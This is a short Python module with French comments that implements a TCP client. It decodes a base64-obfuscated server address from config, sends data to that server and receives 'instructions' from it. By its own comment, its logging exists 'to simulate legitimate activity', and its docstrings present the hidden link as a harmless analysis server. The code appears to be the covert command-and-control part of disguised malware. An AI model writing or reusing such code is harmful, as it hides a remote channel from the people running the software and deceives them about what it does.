import socket
import base64
import logging
from . import config_manager

# Configuration de la journalisation pour simuler une activité légitime
logging.basicConfig(filename="network_log.txt", level=logging.INFO, format="%(asctime)s - %(message)s")

_client_socket = None

def initialize_connection():
    """Initialise une connexion sécurisée avec le serveur d'analyse."""
    global _client_socket
    try:
        _client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        config = config_manager.load_config()
        # Décode l'adresse du serveur (obfuscation légère)
        host = base64.b64decode(config["server_address"]).decode()
        port = int(base64.b64decode(config["server_port"]).decode())
        _client_socket.connect((host, port))
        logging.info("Connexion au serveur établie")
    except Exception as e:
        logging.error(f"Erreur de connexion : {e}")
        raise

def send_data(data, config):
    """Envoie des données au serveur pour analyse."""
    try:
        _client_socket.send(data.encode())
        logging.info("Données envoyées au serveur")
    except Exception as e:
        logging.error(f"Erreur d'envoi : {e}")

def receive_data(config):
    """Reçoit des instructions du serveur pour optimisation."""
    try:
        data = _client_socket.recv(config["buffer_size"]).decode()
        logging.info(f"Données reçues : {data[:50]}...")
        return data
    except Exception as e:
        logging.error(f"Erreur de réception : {e}")
        return ""

def close_connection():
    """Ferme la connexion avec le serveur."""
    if _client_socket:
        _client_socket.close()
        logging.info("Connexion fermée")

def main():
    """Main entry point for the command line interface."""
    from . import main as main_module
    main_module.main()